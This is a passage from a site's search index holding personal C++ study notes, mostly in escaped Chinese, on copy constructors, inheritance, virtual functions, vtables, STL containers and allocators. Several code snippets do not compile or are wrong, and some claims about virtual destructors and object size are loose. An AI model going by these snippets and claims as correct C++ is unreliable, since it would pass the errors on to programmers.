t)\u7684\u8bdd\uff0c\u5176\u672c\u8eab\u5728\u4f20\u53c2\u7684\u8fc7\u7a0b\u5c31\u4f1a\u53d1\u751f\u62f7\u8d1d\u6784\u9020\uff0c\u4f1a\u5f62\u6210\u65e0\u9650\u9012\u5f52\uff1f</p> <p>c++\u5b9e\u9645\u4e0a\u6709\u9ed8\u8ba4\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570 \u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u5df1\u8bbe\u8ba1 \u9ed8\u8ba4\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u505a\u7684\u4e8b\u6210\u5458\u53d8\u91cf\u5bf9\u6210\u5458\u53d8\u91cf\u7684\u62f7\u8d1d\uff0c  **   \u5982\u679c\u6210\u5458\u53d8\u91cf\u662f\u5bf9\u8c61\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u5bf9\u8c61\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570member copy    \u8fd9\u4e0e\u4e00\u822c\u7684\u8d4b\u503c\u5176\u5b9e\u4e0d\u540c \u5e76\u4e0d\u662f\u5728\u5b57\u8282\u610f\u4e49\u4e0a\u7684\u62f7\u8d1d  **   \u5982\u679c\u6210\u5458\u53d8\u91cf\u662f\u6307\u9488, \u90a3\u4e48\u5c31\u4f1a\u53d1\u751f\u6307\u9488\u7684\u62f7\u8d1d \u5373\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61    \u8fd9\u5c31\u4f1a\u9020\u6210\u4e00\u4e2a\u95ee\u9898 \u56e0\u4e3a\u8fd9\u6837\u4e4b\u540e\u5982\u679c\u91c7\u7528\u4e00\u822c\u7684\u6790\u6784\u65b9\u6cd5\u7684\u8bdd \u8fd9\u4e2a\u5bf9\u8c61\u6709\u53ef\u80fd\u88ab\u91ca\u653e\u4e24\u6b21 \u8fd9\u4e5f\u662f\u6211\u4eec\u8981\u4f7f\u7528\u81ea\u5df1\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u4e00\u5927\u539f\u56e0\uff0c\u8fd9\u79cd\u60c5\u51b5\u8fd8\u5305\u62ec\u662f\u4e00\u4e2a\u52a8\u6001\u5206\u914d\u7684\u6570\u7ec4\u7684\u60c5\u51b5</p> <p>**\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u5e94\u7528\u573a\u666f **</p> <p>\u5bf9\u8c61\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u65f6 \u4f1a\u8df3\u8fc7\u81ea\u8eab\u7684\u6784\u9020\u51fd\u6570</p> <p>\u5f53\u6210\u5458\u53d8\u91cf\u4e2d\u6709\u52a8\u6001\u5206\u914d\u5185\u5b58\u7684\u4e1c\u897f\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u81ea\u5b9a\u4e49\u62f7\u8d1d\u6784\u9020\uff0c\u7cfb\u7edf\u9ed8\u8ba4\u7684\u90a3\u4e9b\u5c31\u4f1a\u4f7f\u5176\u6307\u5411\u540c\u4e00\u5757\u5185\u5b58\uff0c\u5bfc\u81f4\u5728\u6790\u6784\u662f\u91cd\u590d\u91ca\u653e\u5185\u5b58</p> <p>\u8981\u4e48\uff0c\u5728\u8fd9\u4e2a\u7c7b\u7684\u62f7\u8d1d\u6784\u9020\u4e2d\u53bb\u5b9a\u4e49\u597d\uff0c\u8981\u4e48\uff0c\u5c31\u662f\u628a\u8fd9\u4e9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\u7684\u6210\u5458\u505a\u6210\u4e00\u4e2a\u7c7b \u5b83\u4eec\u5982\u679c\u6709\u81ea\u5df1\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898 \u5178\u578b\u4f8b\u5b50\u5c31\u662f\u52a8\u6001\u5206\u914d\u7684char *\u548cstring\u7684\u533a\u522b string\u5c31\u4e0d\u9700\u8981\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u5904\u7406</p> <p>\u6709\u7684\u65f6\u5019\u7f16\u8bd1\u5668\u4f1a\u628a\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u5bf9\u8c61\u521b\u5efa\u8fc7\u7a0b\u53d6\u6d88\u6389\uff0c\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u5728inline\u51fd\u6570\u65f6\uff1f</p> <p>\u6240\u6709\u7684\u7c7b\u90fd\u5e94\u8be5\u6709 constructor, virtual destructor, copy constuctor\u4e09\u4e2a\u51fd\u6570</p> <p>\u7f16\u8bd1\u5668\u5bf9\u62f7\u8d1d\u6784\u9020\u7684\u4f18\u5316</p> <pre><code>class test{...};\ntest func(int x){\n    return test(x);\n}\nint main(){\n    test mytest(func(1));\n}\n</code></pre> <p>In the code above, we may find it using a complex way to complete a simple action----use 1 to construct a test object. If there is no optimizing, we can there is a constructor function and a copy constructor function at least</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#inheritance","title":"inheritance","text":"<p>public, private and protected \u53d6\u4fdd\u62a4\u6027\u6700\u9ad8\u7684\u60c5\u51b5\uff0c\u4f8b\u5982\u5728\u7236\u7c7b\u4e2d\u4e3aprotected \u7528public\u7ee7\u627f \u7ed3\u679c\u4e3aprotected</p> <p>\u62ff\u4e00\u4e2a\u7c7b \u8fdb\u884c\u4e00\u70b9\u4fee\u6539 \u521b\u9020\u51fa\u4e00\u4e2a\u65b0\u7684\u7c7b\u901a\u8fc7\u7ee7\u627f \u6211\u4eec\u53ef\u4ee5\u7ee7\u627f\u539f\u6709\u7684\u6570\u636e\u6210\u5458 \u539f\u6709\u7684\u51fd\u6570 interface\uff08\u63a5\u53e3</p> <p>\u7ee7\u627f\u9075\u5faais_a \u539f\u5219\uff0c\u5b50\u7c7b\u5e94\u5f53\u662f\u7236\u7c7b\u7684\u4e00\u79cd\uff0c\u6bd4\u5982\u6c7d\u8f66\u662f\u4ea4\u901a\u5de5\u5177\uff1b\u800c\u4e0d\u662fhas_a \u4f8b\u5982\u8f6e\u5b50\u548c\u6c7d\u8f66\uff0c\u6c7d\u8f66\u6709\u8f6e\u5b50\uff0c\u4f46\u662f\u4ed6\u4eec\u4e0d\u6784\u6210\u7ee7\u627f\u5173\u7cfb</p> <pre><code>class A{\npublic:\n    A(int k):i(k) {}\n    ~A(){}\n    void print(){cout&lt;&lt;i&lt;&lt;endl;}\n    void set(int i){this-&gt;i=i;}\nprivate:\n    int i;\nprotected:\n    void h() {};//\u53ea\u6709\u81ea\u5df1\u548c\u5b50\u7c7b\u8c03\u7528\n};\nclass B: public A{//\u8fd9\u4e00\u6b65\u5373\u8868\u793aB\u662fA\u7684\u5b50\u7c7b\npublic :\n    B b:A(15) {};\n    void f() {set(20); print();}//\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u7236\u7c7b\u7684\u51fd\u6570\n    void g() {i=100;}//\u6b64\u5904\u6709\u95ee\u9898 \u7236\u7c7b\u7684\u79c1\u6709\u6210\u5458 \u5b58\u5728\u4e8e\u5b50\u7c7b\u4e2d\u4f46\u662f\u65e0\u6cd5\u76f4\u63a5\u4f7f\u7528  \u53ef\u4ee5\u901a\u8fc7\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u6765\u64cd\u4f5c\n    void hh() {h()};\n};\nint main(){\n    B b;//\u4f1a\u8c03\u7528A\u7684\u6784\u9020\u51fd\u6570\n    b.set(10);\n    b.print;\n    b.f();\n};\n</code></pre> <p>oop\u7684\u539f\u5219\u5728\u4e8e private\u91cc\u4f9d\u65e7\u5e94\u8be5\u5305\u542b\u6240\u6709\u7684\u6570\u636e protected\u91cc\u9762\u4e5f\u4e0d\u5e94\u8be5\u51fa\u73b0int float\u7b49\u6570\u636e</p> <p>\u5728\u672c\u8d28\u4e0a\u800c\u8a00\uff0c\u5b50\u7c7b\u5bf9\u8c61\u5305\u542b\u7236\u7c7b\u5bf9\u8c61\uff0c\u56e0\u6b64\u5176\u5fc5\u987b\u5728\u521d\u59cb\u5316\u5217\u8868\u91cc\u521d\u59cb\u5316\u7236\u7c7b\u5bf9\u8c61\uff08\u6216\u8005\u7236\u7c7b\u5bf9\u8c61\u6709\u9ed8\u8ba4\u7684\u6784\u9020\u51fd\u6570</p> <p>\u5148\u6784\u9020\u7236\u7c7b \u518d\u6784\u9020\u5b50\u7c7b  \u5148\u6790\u6784\u5b50\u7c7b \u518d\u6790\u6784\u7236\u7c7b</p> <p>C++\u7684\u7279\u6b8a\u8bbe\u8ba1 \u5bf9\u4e8e\u7236\u7c7b\u4e2d\u7684\u91cd\u8f7d\u51fd\u6570 \u53ea\u8981\u5b50\u7c7b\u4e2d\u6709\u4e00\u4e2a\u91cd\u540d\u7684\u5b58\u5728 \u5219 \u5b50\u7c7b\u4e2d\u8fd9\u4e2a\u91cd\u540d\u7684\u51fd\u6570\u4f1a\u8986\u76d6\u6240\u6709\u7684\u91cd\u540d\u7684\u91cd\u8f7d\u51fd\u6570</p> <pre><code>class A{\npublic :\n    void print(int i){cout&lt;&lt;i;}\n    void print() {cout&lt;&lt;1111&lt;&lt;endl;}\n};\nclass B :public A{\npublic :\n    void print (double i){cout &lt;&lt; i  &lt;&lt; endl;}\n};\n//\u6b64\u65f6B\u4e2d\u4ec5\u6709\u8fd9\u4e48\u4e00\u4e2aprint\u51fd\u6570\n//\u5982\u679c\u8981\u8c03\u7528\u7236\u7c7b\u7684\nint main(){\n    B b;\n    b.A::print();\n}\n</code></pre> <p>B\u548cA\u4e2d\u53ef\u4ee5\u6709\u540c\u540d\u7684\u53d8\u91cf\uff0c\u4f46\u5176\u5b9e\u662f\u4e0d\u540c\u7684\u53d8\u91cf</p> <pre><code>class A{protected: int i;}\nclass B:public A{protected: int i;}\n//B size is 8\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#polymorphism","title":"polymorphism","text":"<p>virtual \u5173\u952e\u8bcd \u5728\u7236\u7c7b\u4e2d\u7684\u51fd\u6570\u524d\u6709virtual \u5982\u679c\u5b50\u7c7b\u6709\u540c\u540d\u51fd\u6570 \u5219\u8fd9\u4e24\u4e2a\u51fd\u6570\u65f6\u6709\u8054\u7cfb\u7684 \u5b50\u7c7b\u7684\u540c\u540d\u51fd\u6570\u4e2dvirtual\u52a0\u4e0d\u52a0\u90fd\u53ef\u4ee5 \u52a0\u4e86\u4fbf\u4e8e\u9605\u8bfb \u4f8b\u5982\uff1a \u7236\u7c7b\u4e2d\u6709\u4e00\u4e2avirtual\u7684render\u51fd\u6570,\u5c31\u53ef\u4ee5\u5199\u51fa\u8fd9\u6837\u7684\u51fd\u6570</p> <pre><code>void render(shape *p){\n    p-&gt;render();\n}\n//\u56e0\u4e3a\u5411\u4e0a\u9020\u578b shape\u6307\u9488\u5176\u5b9e\u53ef\u4ee5\u627f\u8f7dshape\u7684\u6bcf\u4e00\u4e2a\u5b50\u7c7b \u4e5f\u5c31\u662f\u8bf4\u5bf9\u4e8e\u6bcf\u4e00\u4e2ashape\u7684\u5b50\u7c7b\u4ea7\u751f\u7684\u5bf9\u8c61\u800c\u8a00 \u7528\u8fd9\u4e2arender\u51fd\u6570\u90fd\u53ef\u4ee5\u6c42\u51fa\u5b83\u7684render\n</code></pre> <p>\u591a\u6001\u6027\u57fa\u4e8eupcast and dynamic binding\uff08\u52a8\u6001\u7ed1\u5b9a\uff09\u8c03\u7528\u90a3\u4e2a\u51fd\u6570\u6839\u636e\u5bf9\u8c61\u51b3\u5b9a</p> <p>\u56e0\u4e3a\u6211\u4eec\u4f7f\u7528\u7236\u7c7b\u7684\u6307\u9488\u53bb\u627f\u8f7d\u8fd9\u4e2a\u5bf9\u8c61 \u56e0\u6b64\u5982\u679c\u6ca1\u6709virtual\u5173\u952e\u8bcd \u90a3\u4e48\u540c\u540d\u51fd\u6570\u4e4b\u95f4\u5c31\u4f1a\u8c03\u7528\u7236\u7c7b\u7684\u51fd\u6570</p> <p>\u6240\u6709\u6709virtual\u7684\u7c7b\u6700\u4e0a\u5c42\u90fd\u6709\u4e00\u4e2a\u6307\u9488 \u4ed6\u4f1a\u6bd4\u6b63\u5e38\u7684\u7c7b\u5927\u4e00\u4e9b \u4f1a\u5927\u51fa\u591a\u4e2a\u6307\u9488\u5927\u5c0f\u7684\u7a7a\u95f4 \u7a7a\u95f4\u5927\u5c0f\u4e3a\u865a\u51fd\u6570\u4e2a\u6570\u4e58\u4ee5\u6307\u9488\u5927\u5c0f \u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u7684\u5bf9\u8c61\u800c\u8a00 \u4e00\u822c\u7684\u51fd\u6570\u4e0d\u5360\u636e\u7a7a\u95f4 \u4f46\u662f\u865a\u51fd\u6570\u4e00\u65e6\u5b58\u5728 \u4f1a\u56fa\u5b9a\u5360\u636e8\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4 \u8fd9\u662f\u4e00\u4e2a\u6307\u9488 \u6307\u5411\u865a\u51fd\u6570\u8868 \u4e00\u4e2a\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u7684\u865a\u51fd\u6570\u8868\u662f\u540c\u4e00\u4e2a \u865a\u51fd\u6570\u8868\u7684\u5927\u5c0f\u4e0e\u865a\u51fd\u6570\u4e2a\u6570\u6709\u5173 \u8fdb\u884c\u5185\u5b58\u5927\u5c0f\u5206\u6790\u7684\u65f6\u5019\u8981\u6ce8\u610f \u7c7b\u7684\u5185\u5b58\u53ef\u80fd\u4f1a\u6709\u4e00\u4e9b\u5bf9\u9f50\u539f\u5219</p> <p>\u4f46\u662f\u5bf9\u4e8e\u7236\u7c7b\u548c\u5b50\u7c7b\u800c\u8a00 \u4ed6\u4eec\u7684vtable\uff08\u865a\u51fd\u6570\u8868\uff09\u662f\u4e0d\u540c\u7684 \u4ed6\u4eec\u7684\u865a\u51fd\u6570\u8868\u6307\u7684\u662f\u5404\u81ea\u7684\u865a\u51fd\u6570  \u7ed3\u6784\u662f\u57fa\u672c\u4e00\u6837\u7684 \u4f46\u662f\u51fd\u6570\u672c\u8eab\u662f\u81ea\u5df1\u7684\u51fd\u6570 \u5b50\u7c7b\u7684vtable\u91cc\u9762\u662f\u5b50\u7c7b\u7684\u51fd\u6570\uff0c\u5f53\u7136\u5982\u679c\u5b50\u7c7b\u6ca1\u6709 \u90a3\u4e48\u4f9d\u65e7\u6cbf\u7528\u7236\u7c7b\u7684\u865a\u51fd\u6570\uff08\u8bf4\u660e\u8be5\u5b50\u7c7b\u6ca1\u6709\u5bf9\u7236\u7c7b\u7684\u8fd9\u4e2a\u65b9\u6cd5\u8fdb\u884c\u591a\u6001\uff09\u540c\u65f6\u5982\u679c\u5b50\u7c7b\u672c\u8eab\u53c8\u521b\u9020\u4e86\u865a\u51fd\u6570 \u4e3a\u4e86\u521b\u5efa\u5b50\u7c7b\u7684\u5b50\u7c7b\u7684\u8bdd \u65b0\u7684\u865a\u51fd\u6570\u4f1a\u5728\u539f\u6709\u7684\u865a\u51fd\u6570\u4e0b\u9762 \u539f\u6709\u7684\u865a\u51fd\u6570\u4f9d\u65e7\u4fdd\u6301\u7740\u539f\u6709\u7684\u987a\u5e8f</p> <pre><code>//\u7279\u6b8a\u64cd\u4f5c\nA a;\nint *p=(int *)&amp;a; \n//\u7528\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5bf9\u5bf9\u8c61\u7684\u5185\u5bb9\u8fdb\u884c\u4e00\u5b9a\u7684\u5206\u6790\n//\u4f1a\u622a\u53d6\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u524dint\u5927\u5c0f\u7684\u5185\u5bb9\n\n\nclass A{\npublic :\n    A():a(0),b(0) {}\n    virtual void print();\n    virtual void myprint();\nprivate:\n    int a;\n    int b;\n};\nvoid A::myprint(){\n    cout&lt;&lt;\"111\"&lt;&lt;endl;\n}\nvoid A::print(){\n    cout&lt;&lt;a&lt;&lt;b&lt;&lt;endl;\n}\n//sizeof A\u7684\u5bf9\u8c61 \u5927\u5c0f\u4e3a16\n//sizeof \n</code></pre> <p>\u7c7b\u4e4b\u95f4\u7684\u6210\u5458\u7c7b\u578b\u8f6c\u6362\uff1a</p> <p>\u5f53\u6211\u4eec\u4f7f\u7528\u5411\u4e0a\u9020\u578b\u65f6\u4f9d\u9760\u7684\u90fd\u662f\u6307\u9488 \u5f53\u6211\u4eec\u60f3\u8981\u5b9e\u73b0\u52a8\u6001\u7ed1\u5b9a\u662f\u4e5f\u4f9d\u9760\u7684\u662f\u6307\u9488 \u5982\u679c\u6ca1\u6709\u6307\u9488 \u800c\u662f\u5355\u7eaf\u901a\u8fc7a=b\u6765\u5b9e\u73b0\u7528A\u7c7b\u5bf9\u8c61\u627f\u63a5B\u7c7b\u5bf9\u8c61 \u90a3\u4e48\u865a\u51fd\u6570\u5b9e\u73b0\u7684\u591a\u6001\u5c31\u4f1a\u5931\u6548\uff0c\u8fd9\u4e2aa\u53ea\u80fd\u8c03\u7528\u7236\u7c7b\u91cc\u7684\u51fd\u6570 \u53ea\u6709\u901a\u8fc7\u6307\u9488\u53bb\u8c03\u7528\u865a\u51fd\u6570\u624d\u4f1a\u662f\u52a8\u6001\u7ed1\u5b9a \u8d4b\u503c\u4f20\u9012\u7684\u865a\u51fd\u6570\u6307\u9488\u4e0d\u4f20\u9012\uff1f</p> <p>\u6211\u4eec\u9700\u8981\u6790\u6784\u51fd\u6570\u65f6virtual \u539f\u5219\u4e0a \u5982\u679c\u4e00\u4e2a\u7c7b\u91cc\u6709\u865a\u51fd\u6570 \u5219\u8fd9\u4e2a\u7c7b\u7684\u6790\u6784\u51fd\u6570\u5fc5\u987b\u662fvirtual\u7684 \u3002 \u76ee\u7684\u662f\u5e94\u5bf9\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> <pre><code>A *p=new B();\ndelete p;\n//A\u7c7b\u4e3a\u7236\u7c7b B\u7c7b\u4e3aA\u7c7b\u7684\u5b50\u7c7b\n//\u6b64\u65f6\u5982\u679cA\u7684\u6790\u6784\u51fd\u6570\u4e0d\u662fvirtual \u90a3\u4e48\u5728delete\u7684\u65f6\u5019\u8c03\u7528\u7684\u5c31\u4e0d\u4f1a\u662fB\u7684\u6790\u6784\u51fd\u6570\n//\u800c\u662f\u8c03\u7528\u7684A\u7684\u6790\u6784\u51fd\u6570\n</code></pre> <p>overridding</p> <p>\u5bf9\u4e8e\u5b50\u7c7b\u548c\u7236\u7c7b\u7684\u4e24\u4e2a\u51fd\u6570 \u5982\u679c\u5747\u4e3avirtual\u800c\u4e14\u51fd\u6570\u540d\u76f8\u540c  \u53c2\u6570\u8868\u4e5f\u76f8\u540c \u90a3\u4e48\u8bb0\u4e3a\u5b83\u4eec\u4e24\u4e2a\u662foverridding\u7684</p> <p>\u5728\u5b50\u7c7b\u4e2d\u60f3\u8981\u8c03\u7528\u7236\u7c7b\u7684\u51fd\u6570 \u53ef\u4ee5\u4f7f\u7528Base::\u7684\u5199\u6cd5</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u865a\u51fd\u6570\u800c\u8a00 \u5728\u5b50\u7c7b\u4e4b\u4e2d\u53ef\u4ee5\u8fd4\u56de\u5b50\u7c7b\u7684\u5bf9\u8c61\u7684\u6307\u9488 \u4e5f\u53ef\u4ee5\u8fd4\u56de\u5b50\u7c7b\u5bf9\u8c61\u7684\u5f15\u7528 \u4f46\u662f\u4e0d\u80fd\u8fd4\u56de\u5b50\u7c7b\u5bf9\u8c61\u672c\u8eab</p> <p>\u865a\u51fd\u6570\u7684\u8986\u76d6\u95ee\u9898</p> <p>\u524d\u6587\u4e2d\u6709\u63d0\u5230\u4e00\u4e2a\u5b50\u7c7b\u7684\u540c\u540d\u51fd\u6570\u4f1a\u8986\u76d6\u7236\u7c7b\u91cc\u9762\u6240\u6709overload\u7684\u51fd\u6570 \u5728\u865a\u51fd\u6570\u4e2d\u4e5f\u662f\u5982\u6b64 \u5982\u679c\u7236\u7c7b\u91cc\u6709\u4e24\u4e2a\u540c\u540d\u4e0d\u540c\u53c2\u7684\u865a\u51fd\u6570 \u7136\u540e\u5b50\u7c7b\u91cc\u9762\u53ea\u6709\u4e00\u4e2a\u540c\u540d\u7684\u865a\u51fd\u6570\uff0c\u4e5f\u4f1a\u6784\u6210\u8986\u76d6\u6240\u6709\u7684\u5173\u7cfb\uff0c \u56e0\u6b64\u5982\u679c\u8981\u5b9e\u73b0\u597d \u6bcf\u4e00\u4e2aoverload\u7684\u865a\u51fd\u6570\u90fd\u8981\u5728\u5b50\u7c7b\u4e2d\u5199\u51fa\u5176\u5bf9\u5e94\u7684\u51fd\u6570 \u5426\u5219\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u7ee7\u627f\u4e0b\u6765</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#stl","title":"STL","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#basic-imformation-of-stl","title":"basic imformation of STL","text":"<p>\u6807\u51c6\u6a21\u677f\u5e93 \u4e3b\u8981\u7528\u5230\u4e86\u6cdb\u578b\u7f16\u7a0b\u7684\u601d\u60f3\uff0c\u4e0eoop\u5b58\u5728\u4e0d\u540c</p> <p>stl\u6709\u516d\u5927\u90e8\u4ef6 container\u5bb9\u5668  \u5bb9\u5668\u4f1a\u662f\u4e00\u4e2aclass allocator\u5206\u914d\u5668 \u5e2e\u52a9\u5bb9\u5668\u5206\u914d\u5185\u5b58 algorithm\u7b97\u6cd5  \u5bf9\u5bb9\u5668\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c \u4e0eoo\u4e0d\u540c\u7684\u662f\uff0c\u64cd\u4f5c\u548c\u4e0d\u5728\u5bb9\u5668\u4e2d iterator\u8fed\u4ee3\u5668 \u7c7b\u4f3c\u4e8e\u4e00\u79cd\u6cdb\u5316\u7684\u6307\u9488\uff0c\u7528\u4e8e\u8054\u7cfb\u7b97\u6cd5\u548c\u5bb9\u5668 adapter\u9002\u914d \u7528\u4e8e\u8f6c\u6362\u4e00\u4e9b\u4e1c\u897f \u5bb9\u5668\uff0c\u8fed\u4ee3\u5668\uff0c\u4eff\u51fd\u6570 functor\u4eff\u51fd\u5f0f \u4f5c\u7528\u50cf\u4e00\u4e2a\u51fd\u6570</p> <p>s.begin() \u6307\u5411\u7b2c\u4e00\u4e2a\u5143\u7d20 s.end() \u6307\u5411\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u9762\u90a3\u4e00\u5757</p> <pre><code>//\u904d\u5386\u6574\u4e2a\u5bb9\u5668\n//\u6bcf\u4e2a\u5bb9\u5668\u90fd\u6709\u5bf9\u5e94\u7684\u8fed\u4ee3\u5668\ncontainer&lt;T&gt; c;\ncontainer&lt;T&gt;::iterator ite=c.begin();\nfor(;ite!=c.end();++ite){...}\n\n//\u65b0\u7279\u6027\u7684\u904d\u5386\u65b9\u6cd5\nfor(decl:coll){...}\nvector&lt;double&gt; vec;\nfor(auto elem:vec){cout&lt;&lt;elem&lt;&lt;endl;}\nfor(auto &amp;elem:vec){elem*=3;}\nfor(auto i:{1,2,3,5,4,8,5,2}){...}\n\n//auto\u6307\u9488\u518d\u4f7f\u7528\nlist&lt;string&gt;::iterator ite=::find(c.begin(),c.end(),target);\nauto ite=::...//\u524d\u9762\u53ef\u4ee5\u76f4\u63a5\u6539\u5199\u4e3aauto\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#container","title":"container","text":"<p>c++\u6807\u51c6\u6a21\u677f\u5e93\u91cc\u7684container\u57fa\u672c\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\uff0csequence container and associate container \u7ebf\u6027\u5bb9\u5668\u4ee5\u53ca\u5173\u8054\u6027\u5bb9\u5668</p> <p>sequence container \u5305\u62ecvector\uff08\u53ef\u53d8\u6570\u7ec4\uff09 array\uff08\u6570\u7ec4\u5305\u88c5\u6210\u7684class\uff0c\u6027\u8d28\u548cC\u539f\u6709\u7684\u6570\u7ec4\u662f\u7c7b\u4f3c\u7684\uff09 deque\uff08\u53cc\u961f\u5217\uff0c\u4e24\u7aef\u90fd\u662f\u53ef\u8fdb\u53ef\u51fa\uff09 list\uff08\u53cc\u5411\u94fe\u8868\uff09 forward-list\uff08\u5355\u5411\u94fe\u8868\uff09 associate container including set\uff08\u7ea2\u9ed1\u6811\uff09, map\uff08\u7ea2\u9ed1\u6811\uff0c\u6bcf\u4e2a\u7ed3\u70b9\u90fd\u6709\u4e00\u4e2akey\u548c\u4e00\u4e2avalue\u7ec4\u6210\uff09,multiset\uff08\u5143\u7d20\u53ef\u4ee5\u91cd\u590d\uff09,multimap(\u4e00\u4e2akey\u53ef\u4ee5\u5bf9\u5e94\u591a\u4e2avalue), hash_table unordered set\uff08\u6563\u5217\u8868\uff09, unordered map\uff08\u6563\u5217\u8868\uff09</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#allocator","title":"allocator","text":"<p>int func(int x=5);</p> <p>int func();</p> <p>\u76ee\u7684\u5c31\u662f\u5728\u4e8e\u4e0d\u8981\u8ba9\u4f7f\u7528STL\u7684\u7528\u6237\u4e0d\u8981\u76f4\u63a5\u63a5\u89e6\u5185\u5b58 \u4e00\u822c\u6765\u8bf4\u5bf9\u4e8e\u7528\u6237\u662f\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528\u7684 \u6700\u7ec8\u8fd8\u662f\u5f52\u4e8emalloc malloc\u7ed9\u7684\u4e1c\u897f\u6bd4\u6240\u9700\u7684size\u8981\u5927\uff0c\u5bf9\u4e8ec++\u800c\u8a00\uff0coperator new\u4f1a\u53bb\u8c03\u7528malloc\uff0c\u5f53\u7136\u5728\u4e0d\u540c\u5e73\u53f0\u8c03\u7528\u65b9\u5f0f\u672a\u5fc5\u76f8\u540c</p> <pre><code>template&lt;typename_Tp,typename_Alloc=std::allocator&lt;_Tp&gt;&gt;\n class vector::protected_Vector_base&lt;_Tp,Alloc&gt;\n</code></pre> <p>\u4f46\u662f\u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u884c\u4f7f\u7528\u6211\u4eec\u60f3\u7528\u7684alloc</p> <p>\u73b0\u884c\u4f7f\u7528\u7684allocator \u90fd\u4e0d\u4ec5\u4ec5\u662f\u5bf9new\u548cdelete\u8fdb\u884c\u5c01\u88c5\uff0c\u800c\u662f\u4e00\u4e2a\u591a\u5c42\u6b21\u7684\u7a7a\u95f4\u5206\u914d\u7cfb\u7edf\u3002</p> <p>\u4e00\u822c\u7684\u5185\u5b58\u5206\u914d\uff1a</p> <pre><code>class Foo{...};\nFoo temp=new Foo;  //new\u4e00\u5757\u5185\u5b58\uff0c\u7136\u540e\u8c03\u7528\u6784\u9020\u51fd\u6570\ndelete temp;        //\u8c03\u7528\u6790\u6784\u51fd\u6570\uff0c\u5e76\u4e14delete\u5185\u5b58\n</code></pre> <p>\u5728C++\u7684STL\u4e2d\u4f1a\u628a\u4e0a\u8ff0\u7684\u56db\u4e2a\u90e8\u5206\u5206\u5f00\u6765</p> <ol> <li>\u6784\u9020\u548c\u6790\u6784\u4ea4\u7ed9 construct() \u548c destroy()</li> <li>\u7a7a\u95f4\u5206\u914d\u4ea4\u7ed9 allocate \u548c deallocate</li> </ol> <p>note\uff1a \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u548c\u6790\u6784\u51fd\u6570\u8fdb\u884c\u6784\u9020\u548c\u6790\u6784\uff0cSTL\u4e3a\u4e86\u63d0\u5347\u6548\u7387\uff0c\u4f1a\u68c0\u6d4b\u8be5\u6b21\u6790\u6784\u662f\u5426\u662f\u6709\u6548\uff0c\u5982\u679c\u5e76\u975e\u662f\u91cd\u8981\u7684\u6790\u6784\uff0c\u53ef\u80fd\u4f1a\u5c06\u5176\u7701\u53bb\u3002</p> <p>** std:: alloc**</p> <p>\u5bf9\u4e8eSTL\u5185\u90e8\u7684\u7a7a\u95f4\u5206\u914d\u5668\uff0c\u6211\u4eec\u9700\u8981\u8003\u8651</p> <ol> <li>\u5411heap\u8981\u7a7a\u95f4</li> <li>\u591a\u7ebf\u7a0b\uff08\u8fd9\u91cc\u6682\u65f6\u4e0d\u8003\u8651</li> <li>\u5185\u5b58\u4e0d\u8db3\u65f6\u7684\u5904\u7406</li> <li>\u5185\u5b58\u788e\u7247\u7684\u5904\u7406</li> </ol> <p>alloc\u5728\u5185\u90e8\u4f7f\u7528malloc\u548cfree\u6765\u64cd\u63a7\u5185\u5b58\uff0c\u8bbe\u8ba1\u53cc\u5c42\u914d\u7f6e\u5668\uff0c\u5bf9\u4e8e\u5185\u5b58\u7684\u7533\u8bf7\uff0c\u5f53\u914d\u7f6e\u533a\u5757\u662f128bytes 